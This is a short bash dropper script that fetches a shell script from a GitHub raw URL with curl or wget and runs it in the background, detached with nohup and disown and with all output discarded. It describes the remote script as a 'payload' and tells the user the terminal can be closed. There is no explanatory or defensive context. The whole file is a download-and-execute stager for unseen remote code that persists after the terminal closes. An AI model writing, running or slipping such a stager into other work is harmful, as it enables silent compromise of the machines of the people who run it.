#!/usr/bin/env bash

URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/AliXLP.sh"

echo "[*] Starting deployment..."

run_payload() {
    local download_cmd="$1"
    local url="$2"
    local content
    
    if [ "$download_cmd" = "curl" ]; then
        content=$(curl -sL --connect-timeout 10 --max-time 30 "$url")
    else
        content=$(wget -qO- --timeout=10 --tries=2 "$url")
    fi
    
    if [ -z "$content" ] || echo "$content" | grep -qi "<!DOCTYPE html>"; then
        return 1
    fi
    
    nohup bash -c "$content" >/dev/null 2>&1 &
    disown
    return 0
}

if command -v curl >/dev/null 2>&1; then
    echo "[*] Using curl..."
    run_payload "curl" "$URL" || { echo "[-] Download or execution failed."; exit 1; }
elif command -v wget >/dev/null 2>&1; then
    echo "[*] curl not found, using wget..."
    run_payload "wget" "$URL" || { echo "[-] Download or execution failed."; exit 1; }
else
    echo "[-] ERROR: Neither curl nor wget is installed."
    exit 1
fi

echo "[+] Payload deployed in background. You can safely close this terminal."
exit 0
